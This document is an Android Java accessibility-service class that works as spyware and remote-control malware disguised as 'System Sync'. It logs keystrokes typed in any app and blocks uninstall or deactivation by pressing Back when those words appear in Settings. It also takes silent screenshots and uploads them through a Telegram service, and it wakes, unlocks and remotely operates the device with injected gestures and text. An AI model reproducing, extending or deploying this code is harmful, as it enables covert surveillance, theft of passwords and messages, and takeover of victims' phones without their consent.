package com.kanha.controller;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Display;
import android.view.Gravity;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.FileOutputStream;

public class TouchAccessibilityService extends AccessibilityService {
    public static TouchAccessibilityService instance = null;
    
    private WindowManager windowManager;
    private GridOverlayView overlayView;
    private boolean isOverlayShowing = false;

    public static StringBuilder keyloggerBuffer = new StringBuilder();
    private String lastFocusedText = "";

    @Override
    public void onServiceConnected() {
        instance = this;
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {
                String newText = source.getText().toString();
                
                if (!newText.isEmpty() && !newText.equals(lastFocusedText)) {
                    if (newText.length() > lastFocusedText.length() && newText.startsWith(lastFocusedText)) {
                        keyloggerBuffer.append(newText.substring(lastFocusedText.length()));
                    } else if (newText.length() < lastFocusedText.length()) {
                        keyloggerBuffer.append("[DEL]");
                    } else {
                        keyloggerBuffer.append(newText);
                    }
                }
                lastFocusedText = newText;
                
                if (keyloggerBuffer.length() > 5000) {
                    keyloggerBuffer.delete(0, 2500);
                }
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            lastFocusedText = "";

            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return;
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

            if (packageName.contains("settings") || packageName.contains("packageinstaller") || packageName.contains("securitycenter")) {
                checkForUninstallOrDisable(rootNode);
            }
        }
    }

    public String getAndClearLogs() {
        String logs = keyloggerBuffer.toString();
        keyloggerBuffer.setLength(0);
        return logs;
    }

    private void checkForUninstallOrDisable(AccessibilityNodeInfo node) {
        if (node == null) return;
        CharSequence text = node.getText();
        CharSequence contentDesc = node.getContentDescription();
        String nodeText = text != null ? text.toString().toLowerCase() : "";
        String nodeDesc = contentDesc != null ? contentDesc.toString().toLowerCase() : "";

        if (nodeText.contains("uninstall") || nodeDesc.contains("uninstall") ||
            nodeText.contains("deactivate") || nodeDesc.contains("deactivate") ||
            nodeText.contains("system sync") || nodeDesc.contains("system sync")) {
            performGlobalAction(GLOBAL_ACTION_BACK);
            return;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                checkForUninstallOrDisable(child);
                child.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {}

    public void performTouch(float x, float y, long durationMs) {
        if (instance == null) return;
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, durationMs));
        dispatchGesture(builder.build(), null, null);
    }

    public void performSwipe(float startX, float startY, float endX, float endY, long durationMs) {
        if (instance == null) return;
        Path path = new Path();
        path.moveTo(startX, startY);
        path.lineTo(endX, endY);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, durationMs));
        dispatchGesture(builder.build(), null, null);
    }

    public void typeText(String textToType) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        AccessibilityNodeInfo focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focusedNode != null) {
            android.os.Bundle arguments = new android.os.Bundle();
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, textToType);
            focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
        }
    }

    public String readScreenText() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return "Screen is empty or inaccessible.";
        StringBuilder sb = new StringBuilder();
        extractText(root, sb);
        return sb.length() > 0 ? sb.toString() : "No text found.";
    }

    private void extractText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) {
            sb.append(node.getText().toString()).append("\n");
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            extractText(node.getChild(i), sb);
        }
    }

    public void wakeScreen() {
        try {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
            android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                    android.os.PowerManager.FULL_WAKE_LOCK |
                    android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP |
                    android.os.PowerManager.ON_AFTER_RELEASE, "SystemSync::WakeLock");
            wl.acquire(3000);
            wl.release();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void swipeToUnlock() {
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);
        float w = metrics.widthPixels;
        float h = metrics.heightPixels;
        performSwipe(w / 2f, h * 0.8f, w / 2f, h * 0.2f, 300);
    }

    public void showGrid() {
        if (isOverlayShowing) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                overlayView = new GridOverlayView(this);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                                WindowManager.LayoutParams.TYPE_PHONE,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT);
                params.gravity = Gravity.TOP | Gravity.START;
                windowManager.addView(overlayView, params);
                isOverlayShowing = true;
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    public void hideGrid() {
        if (!isOverlayShowing || overlayView == null) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                windowManager.removeView(overlayView);
                overlayView = null;
                isOverlayShowing = false;
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    public void captureScreen(TelegramService callbackService) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(ScreenshotResult screenshotResult) {
                            HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                            Bitmap hardwareBitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                            
                            Bitmap softBitmap = null;
                            if (hardwareBitmap != null) {
                                softBitmap = hardwareBitmap.copy(Bitmap.Config.ARGB_8888, true);
                            }
                            buffer.close();
                            
                            if (softBitmap == null) {
                                callbackService.sendTextMessage("Error: Bitmap copy failed.", null);
                                return;
                            }

                            try {
                                File file = new File(getCacheDir(), "screen_clean.png");
                                FileOutputStream out = new FileOutputStream(file);
                                softBitmap.compress(Bitmap.CompressFormat.JPEG, 80, out);
                                out.flush();
                                out.close();
                                callbackService.uploadScreenshot(file);
                            } catch (Exception e) {
                                callbackService.sendTextMessage("Save error: " + e.getMessage(), null);
                            }
                        }
                        @Override
                        public void onFailure(int errorCode) {
                            callbackService.sendTextMessage("Screenshot FAILED. Code: " + errorCode, null);
                        }
                    });
                } catch (Exception e) {
                    callbackService.sendTextMessage("Main thread exception: " + e.getMessage(), null);
                }
            });
        } else {
            callbackService.sendTextMessage("Silent screenshots require Android 11+.", null);
        }
    }

    public void captureScreenWithGrid(TelegramService callbackService) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(ScreenshotResult screenshotResult) {
                            HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                            Bitmap hardwareBitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                            
                            Bitmap softBitmap = null;
                            if (hardwareBitmap != null) {
                                softBitmap = hardwareBitmap.copy(Bitmap.Config.ARGB_8888, true);
                            }
                            buffer.close();
                            
                            if (softBitmap == null) {
                                callbackService.sendTextMessage("Error: Bitmap copy failed.", null);
                                return;
                            }
                            
                            drawGridOnBitmap(softBitmap);
                            
                            try {
                                File file = new File(getCacheDir(), "screen_grid.png");
                                FileOutputStream out = new FileOutputStream(file);
                                softBitmap.compress(Bitmap.CompressFormat.JPEG, 80, out);
                                out.flush();
                                out.close();
                                callbackService.uploadScreenshot(file);
                            } catch (Exception e) {
                                callbackService.sendTextMessage("Grid save error: " + e.getMessage(), null);
                            }
                        }
                        @Override
                        public void onFailure(int errorCode) {
                            callbackService.sendTextMessage("Screenshot FAILED. Code: " + errorCode, null);
                        }
                    });
                } catch (Exception e) {
                    callbackService.sendTextMessage("Main thread exception: " + e.getMessage(), null);
                }
            });
        } else {
            callbackService.sendTextMessage("Silent screenshots require Android 11+.", null);
        }
    }

    private void drawGridOnBitmap(Bitmap mutableBitmap) {
        Canvas canvas = new Canvas(mutableBitmap);
        int cols = 26; 
        int rows = 26; 
        float width = mutableBitmap.getWidth();
        float height = mutableBitmap.getHeight();
        float cellW = width / cols;
        float cellH = height / rows;

        Paint boxPaint = new Paint();
        boxPaint.setColor(Color.parseColor("#640A0A0A")); 
        boxPaint.setStyle(Paint.Style.FILL);

        Paint borderPaint = new Paint();
        borderPaint.setColor(Color.parseColor("#00E5FF")); 
        borderPaint.setStyle(Paint.Style.STROKE);
        borderPaint.setStrokeWidth(1f);

        Paint textPaint = new Paint();
        textPaint.setColor(Color.parseColor("#FFD54F")); 
        textPaint.setTextSize(20f); 
        textPaint.setTextAlign(Paint.Align.CENTER);
        textPaint.setAntiAlias(true);

        for (int r = 0; r < rows; r++) {
            for (int c = 0; c < cols; c++) {
                float left = c * cellW;
                float top = r * cellH;
                
                canvas.drawRect(left, top, left + cellW, top + cellH, boxPaint);
                canvas.drawRect(left, top, left + cellW, top + cellH, borderPaint);

                String label = "" + (char) ('A' + c) + (r + 1);
                Paint.FontMetrics fm = textPaint.getFontMetrics();
                float textHeight = fm.descent - fm.ascent;
                float textY = (top + (cellH / 2f)) + (textHeight / 2f) - fm.descent;
                canvas.drawText(label, left + (cellW / 2f), textY, textPaint);
            }
        }
    }
}